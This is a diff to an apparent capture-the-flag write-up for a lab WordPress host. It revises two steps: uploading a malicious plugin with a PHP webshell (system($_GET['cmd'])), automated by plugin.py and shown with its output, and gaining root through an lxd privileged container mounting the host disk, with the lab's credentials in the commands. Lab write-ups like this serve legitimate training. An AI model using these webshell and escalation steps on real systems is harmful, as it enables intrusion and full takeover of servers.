@@ -128,25 +128,44 @@ Shell lands as `www-data`.
 
 ### Method B — Malicious Plugin Upload
 
-Create a minimal WordPress plugin containing a PHP webshell:
+Use `plugin.py` to generate and auto-upload a malicious WordPress plugin containing a PHP webshell:
 
 ```bash
-mkdir -p webshell-plugin
-cat > webshell-plugin/webshell.php <<'EOF'
+python3 plugin.py -U http://10.49.131.138/wordpress elyana 'H@ckme@123'
+```
+
+```
+[*] Building plugin zip...
+[+] Created malicious.zip
+    Contains: malicious/description.php, malicious/webshell.php
+[*] Fetching login page: http://10.49.131.138/wordpress/wp-login.php
+[*] Logging in as 'elyana'...
+[+] Login successful
+[*] Fetching upload page to extract nonce...
+[+] Got nonce: d3c0fe1f55
+[*] Uploading malicious.zip...
+[+] Plugin uploaded and installed successfully!
+
+[+] Webshell URL:
+      http://10.49.131.138/wordpress/wp-content/plugins/malicious/webshell.php?cmd=whoami
+```
+
+Alternatively, build the zip manually and upload via the admin panel (Plugins → Add New → Upload Plugin):
+
+```bash
+mkdir -p malicious
+cat > malicious/description.php <<'EOF'
 <?php
 /**
- * Plugin Name: Webshell
+ * Plugin Name: malicious
  * Version: 1.0
  */
-system($_GET['cmd']);
+?>
 EOF
-zip -j webshell-plugin.zip webshell-plugin/webshell.php
-```
-
-In the WordPress admin panel, go to Plugins → Add New → Upload Plugin. Upload `webshell-plugin.zip` and activate it. The shell is now accessible at:
-
-```
-http://10.49.131.138/wordpress/wp-content/plugins/webshell-plugin/webshell.php?cmd=id
+cat > malicious/webshell.php <<'EOF'
+<?php system($_GET['cmd']); ?>
+EOF
+zip -r malicious.zip malicious/
 ```
 
 Use the same `nc` listener and Python3 reverse shell payload as in Method A to get a `www-data` shell.
@@ -299,20 +318,38 @@ sudo ./build-alpine
 # produces: alpine-v3.xx-x86_64-<date>.tar.gz
 ```
 
-Transfer the image to the target via SFTP:
+Create `escalate.sh` on the attacker machine:
 
 ```bash
-sshpass -p 'E@syR18ght' scp alpine*.tar.gz elyana@10.49.131.138:/tmp/
-```
-
-On the target, import the image and set up the privileged container:
-
-```bash
-lxc image import /tmp/alpine*.tar.gz --alias x
+cat > escalate.sh <<'EOF'
+#!/bin/bash
+lxc image import ./alpine*.tar.gz --alias x
 lxc init x x -c security.privileged=true
 lxc config device add x x disk source=/ path=/mnt/ recursive=true
 lxc start x
 lxc exec x /bin/sh
+EOF
+```
+
+Transfer both files to the target via SFTP:
+
+```bash
+sftp elyana@10.49.131.138
+sftp> put alpine-v3.13-x86_64-20210218_0139.tar.gz
+sftp> put escalate.sh
+sftp> bye
+```
+
+Alternatively, use `sshpass` to transfer non-interactively:
+
+```bash
+sshpass -p 'E@syR18ght' scp alpine*.tar.gz escalate.sh elyana@10.49.131.138:/home/elyana/
+```
+
+On the target, run the script:
+
+```bash
+bash escalate.sh
 ```
 
 Inside the container, the host filesystem is mounted at `/mnt/`. Read the flags directly:
@@ -341,8 +378,8 @@ cat /mnt/home/elyana/user.txt
     │
     ├─ WP admin login (elyana:H@ckme@123)
     │       │
-    │       ├─ [A] Theme Editor → 404.php ─► PHP webshell → www-data RCE
-    │       └─ [B] Malicious plugin upload ► PHP webshell → www-data RCE
+    │       ├─ [A] Theme Editor → 404.php ──────────────► PHP webshell → www-data RCE
+    │       └─ [B] plugin.py auto-upload (malicious.zip) ► PHP webshell → www-data RCE
     │
     ├─ www-data shell
     │       │
@@ -359,7 +396,8 @@ cat /mnt/home/elyana/user.txt
     │
     └─── [Path 3] SSH elyana:E@syR18ght
              └─ id → lxd group
-                  └─ lxc privileged container + host disk mount ► root (via /mnt/)
+                  └─ sftp: put alpine*.tar.gz + escalate.sh
+                       └─ bash escalate.sh → privileged container + host disk mount ► root (via /mnt/)
 ```
 
 ---
